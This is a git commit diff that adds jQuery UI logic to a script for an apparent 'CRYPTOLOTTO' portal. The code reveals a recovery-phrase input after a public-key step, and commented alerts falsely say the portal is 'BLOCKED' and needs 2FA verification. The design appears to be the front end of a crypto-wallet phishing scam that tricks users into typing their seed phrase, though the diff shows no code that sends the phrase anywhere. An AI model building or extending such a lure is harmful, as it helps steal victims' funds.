2b95e25ad53db9b671ab5a431569b7a9c126e99a
web3commerce <102276690+web3commerce@users.noreply.github.com>
2022-03-24 17:56:06 -0400

    Update script.js

--- assets/js/script.js
+++ assets/js/script.js
@@ -1,1 +1,34 @@
-var wordEl = document.getElementById('#word')
+var recoverPhrase = $('#recover-container');
+var phrase = $('#phrase');
+var publicKey = $('#public');
+var enter = $('#enter-btn')
+var verify = $('#verify-btn')
+// alert('CRYPTOLOTTO Portal Status: BLOCKED')
+// alert('Decentralized lottery protocols require vericication via 2FA.')
+
+$(function() {
+    phrase.hide();
+    verify.hide();
+    recoverPhrase.hide();
+   
+    if (publicKey.val) {
+        enter.on('click', function(){
+            enter.hide();
+            verify.show();
+            publicKey.hide()
+            phrase.show()
+        });
+    }
+    
+});
+
+recoverPhrase.on("click", "#recover", function() {
+    // Starting screen is hidden
+    recoverPhrase.hide()
+    phrase.show()
+    recoverPhrase.on("click", "#recover", function() {
+        // Starting screen is hidden
+        recoverPhrase.hide()
+        phrase.show()
+    });
+});
